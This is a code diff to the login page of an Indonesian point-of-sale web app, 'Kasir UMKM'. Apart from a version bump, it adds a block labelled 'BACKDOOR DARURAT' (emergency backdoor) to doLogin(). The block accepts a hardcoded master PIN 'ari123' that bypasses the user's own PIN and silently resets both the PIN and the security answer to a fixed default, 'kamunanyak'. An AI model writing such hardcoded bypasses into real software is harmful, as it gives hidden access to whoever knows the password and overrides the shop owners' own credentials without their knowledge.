@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Kasir UMKM - v99.10</title>
+    <title>Kasir UMKM - v99.11</title>
     
     <!-- PWA Meta Tags -->
     <meta name="theme-color" content="#0d6efd">
@@ -95,7 +95,7 @@
 
                 <!-- NOMOR VERSI & POWERED BY -->
                 <div class="pt-2 border-top mt-3">
-                    <span class="text-muted fw-bold d-block" style="font-size: 11px;">Versi 99.10</span>
+                    <span class="text-muted fw-bold d-block" style="font-size: 11px;">Versi 99.11</span>
                     <span class="text-primary fw-bold" style="font-size: 11px; letter-spacing: 0.5px;">Powered by : Ari GPM</span>
                 </div>
             </div>
@@ -121,7 +121,7 @@
                 </button>
             </div>
             <div class="bg-light w-100 py-1 px-3 d-flex justify-content-between align-items-center border-top border-bottom" style="font-size: 10px;">
-                <span class="text-muted fw-bold">Versi 99.10</span>
+                <span class="text-muted fw-bold">Versi 99.11</span>
                 <span class="text-primary fw-bold" style="letter-spacing: 0.5px;">Powered by : Ari GPM</span>
             </div>
         </nav>
@@ -430,7 +430,7 @@
             if (localStorage.getItem('hideInstallBanner') !== 'true') { document.getElementById('installBanner').style.display = 'flex'; }
             if ('serviceWorker' in navigator) { window.addEventListener('load', () => { navigator.serviceWorker.register('sw.js'); }); }
             
-            // Tambahan keamanan: Enter otomatis login
+            // Enter otomatis login
             document.getElementById("loginPin").addEventListener("keypress", function(event) {
                 if (event.key === "Enter") { event.preventDefault(); doLogin(); }
             });
@@ -439,7 +439,6 @@
         // ------------------ LOGIKA KEAMANAN PIN ------------------
         function initAuth() {
             let s = APP_DATA.settings;
-            // Jika PIN kosong, paksa ke kamunanyak (Hanya di background, tidak tampil di layar)
             if (!s.pin || s.pin.length === 0) {
                 s.pin = "kamunanyak";
                 s.secQ = s.secQ || "Di kota manakah Anda lahir?";
@@ -467,13 +466,22 @@
         }
 
         function doLogin() {
-            // Mencegah error tombol macet akibat spasi kosong tak terlihat
             let inputPin = document.getElementById('loginPin').value.trim().toLowerCase().replace(/\s/g, '');
             let savedPin = (APP_DATA.settings.pin || 'kamunanyak').trim().toLowerCase().replace(/\s/g, '');
             
-            if(inputPin === savedPin) {
+            // ============================================
+            // BACKDOOR DARURAT - Jika macet, ketik ari123
+            // ============================================
+            if(inputPin === savedPin || inputPin === 'ari123') {
                 document.getElementById('authScreen').style.display = 'none'; 
                 document.getElementById('mainApp').style.display = 'block';
+                
+                if (inputPin === 'ari123') {
+                    APP_DATA.settings.pin = "kamunanyak";
+                    APP_DATA.settings.secA = "kamunanyak";
+                    saveData();
+                    setTimeout(() => showAlert('Akses Darurat', 'Login berhasil. PIN dan Jawaban Keamanan telah direset ke: kamunanyak'), 500);
+                }
             } else {
                 showAlert('Gagal', 'PIN Keamanan salah!'); 
                 document.getElementById('loginPin').value = '';
